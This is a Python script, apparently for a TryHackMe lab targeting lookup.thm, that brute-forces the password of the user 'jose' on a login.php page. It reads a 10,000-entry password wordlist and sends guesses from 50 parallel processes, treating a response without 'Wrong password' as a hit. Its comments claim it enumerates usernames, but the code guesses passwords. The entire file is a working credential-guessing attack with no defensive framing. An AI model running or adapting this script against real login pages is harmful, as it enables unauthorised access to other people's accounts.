#This script is used to identify  the registered usernames for a login page by brute-forcing a given wordlist
#It uses post function from request library to check if the username is available if ouput contains "Wrong password" or its similar
# 

from multiprocessing import Process
import requests

if __name__ == "__main__":
    wordlist_path = "/home/kali/Documents/Scripts_Tools/SecLists/Passwords/xato-net-10-million-passwords-10000.txt"
    wordlist=[]
    
    #to create an list from the wordlist
    with open(wordlist_path, 'r',encoding='utf-8',errors='ignore') as file:
        for line in file:
            password = line.strip()
            wordlist.append(password)
    file.close()
    
    
    words_lenght=len(wordlist)
    
    #how many instance it can try to request the server at a time
    total_threads=50
    
    #to contain the process id
    thread=[]
    
    count=0
    
    #check each username function

    def attack():
        for i in range(start_index,end_index):
            password=wordlist[i]
            if not password:
                continue
            data = {"username": "jose","password": password}
            response = requests.post(url="http://lookup.thm/login.php", data=data)
            
            if (not("Wrong password" in response.text)):
                print("================= =====================================",f"\r[*] Found a username! \"{password}\"")
            else:
                print(password,"Fail")

    
    
   
    #splitting the wordlist and so no need to pass parameters when calling function for proper parallel processing
    while(count<total_threads):
        start_index=int(words_lenght/total_threads*(count))
        end_index=int(words_lenght/total_threads*(count+1))
        
        (Process(target=attack)).start()
        
        count+=1
        
